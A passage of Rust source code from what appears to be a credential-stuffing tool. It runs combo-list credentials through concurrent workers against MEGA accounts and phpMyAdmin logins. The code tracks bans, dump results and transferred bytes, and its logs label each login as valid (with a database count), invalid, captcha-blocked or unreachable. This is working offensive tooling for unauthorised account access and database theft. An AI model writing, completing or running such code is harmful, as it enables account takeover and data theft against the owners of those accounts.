                                target: combo_line.clone(),
                                files: files.len(),
                                bytes: if upload_files {
                                    Some(stats.uploaded_bytes)
                                } else {
                                    Some(stats.cloud_bytes)
                                },
                            });
                        } else {
                            info!("MEGA {} — {}", combo_line, stats.detail_line());
                        }
                    }
                    Err(err) => {
                        let err_text = format!("{err:#}");
                        let status = scan_status_for_mega_anyhow(&err);
                        let banned = mega_is_banned_anyhow(&err);
                        let result = ScanResult {
                            credential: cred.clone(),
                            status,
                            message: Some(err_text.clone()),
                            databases: Vec::new(),
                        };
                        let _ = record_mega_v46_result(&out, &result, false, banned).await;
                        emit_scan_result(&cb, &result);
                        if let Some(ref callback) = cb {
                            callback(ProgressEvent::DumpFailed {
                                target: combo_line.clone(),
                                error: err_text,
                            });
                        } else {
                            warn!("MEGA FAIL {} — {}", combo_line, err);
                        }
                    }
                }
            }
        }));
    }

    let cancel_feed = cancel.clone();
    handles.push(tokio::spawn(async move {
        for cred in creds {
            if cancelled(&cancel_feed) {
                break;
            }
            if work_tx.send(cred).await.is_err() {
                break;
            }
        }
    }));

    await_download_handles(handles, &cancel).await;

    if let Some(ref callback) = on_progress {
        callback(ProgressEvent::AllComplete);
    }
    info!(
        "error log: {}",
        output.join(ERROR_LOG_FILENAME).display()
    );

    Ok(())
}

fn format_scan_log(result: &ScanResult) -> String {
    let cred = &result.credential;
    match result.status {
        ScanStatus::Valid => format!(
            "OK   {} ({} db)",
            cred.display_line(),
            result.databases.len()
        ),
        ScanStatus::InvalidCredentials => format!("FAIL {} — invalid credentials", cred.display_line()),
        ScanStatus::NotPhpMyAdmin => format!("FAIL {} — not phpMyAdmin", cred.display_line()),
        ScanStatus::Captcha => format!("FAIL {} — captcha/cloudflare", cred.display_line()),
        ScanStatus::Unreachable => format!("FAIL {} — unreachable", cred.display_line()),
        ScanStatus::Error => format!(
            "FAIL {} — {}",
            cred.display_line(),
            result.message.as_deref().unwrap_or("unknown error")
        ),
    }
}
